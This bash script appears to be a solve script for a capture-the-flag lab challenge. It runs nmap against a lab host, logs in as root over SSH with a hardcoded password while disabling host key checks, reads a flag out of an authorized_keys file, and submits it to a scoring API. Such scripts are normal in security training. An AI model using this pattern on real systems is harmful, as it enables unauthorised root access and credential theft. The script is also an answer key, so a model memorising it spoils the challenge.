#!/bin/bash
set -euo pipefail

HOST='172.20.0.141'
USER='root'
PASSWORD='NeonBoard-47!'
CHALLENGE_ID='scl-challenge-frame-ebf0f2'

nmap -Pn -p 22 "$HOST" >/dev/null
encoded="$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 "$USER@$HOST" "awk '/flag-b64=/{sub(/^.*flag-b64=/, \"\"); print; exit}' /home/syncboard/.ssh/authorized_keys")"
flag="$(python3 -c 'import base64,sys; print(base64.b64decode(sys.argv[1]).decode())' "$encoded")"
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"$CHALLENGE_ID\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
printf '\n'
